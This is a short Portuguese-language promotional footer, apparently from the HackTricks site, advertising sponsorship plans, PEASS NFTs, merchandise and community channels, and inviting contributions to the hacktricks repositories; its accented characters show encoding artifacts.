* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
